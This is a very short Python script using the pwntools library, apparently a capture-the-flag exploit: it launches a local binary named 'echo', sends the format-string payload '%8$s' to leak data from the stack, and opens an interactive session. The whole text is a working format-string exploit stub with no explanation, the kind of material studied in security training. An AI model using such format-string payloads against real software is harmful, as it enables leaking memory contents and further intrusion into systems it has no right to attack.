from pwn import *

io = process('./echo')
io.send(b'%8$s')

io.interactive()
